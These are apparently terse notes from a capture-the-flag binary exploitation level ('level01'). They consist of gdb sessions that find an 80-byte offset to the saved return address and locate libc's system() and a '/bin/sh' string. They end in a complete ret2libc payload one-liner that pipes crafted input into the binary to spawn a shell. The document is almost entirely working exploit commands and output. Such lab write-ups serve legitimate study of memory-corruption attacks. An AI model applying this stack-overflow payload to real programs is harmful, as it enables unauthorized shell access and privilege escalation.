b *main + 169
run
dat_will
AAAAAAAA
i f
Stack level 0, frame at 0xffffd720:
 eip = 0x8048579 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd710, ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
(gdb) i r
eax            0xffffd6cc       -10548

0xffffd71c - 0xffffd6cc => 0x50 => 80
offset buffer/EIP 80 oct

system:
p system
$1 = {text variable, no debug info} 0xf7e6aed0 system


method: https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb?rq=1
(gdb) b *main
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d0 in main ()
(gdb) info proc map
process 1815
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2b000,0xf7e2c000,"/bin/sh"
Pattern not found.
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.


SHELL=/bin/sh
(python -c "print 'dat_wil\n' + 'A'*80 + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'";cat) | ./level01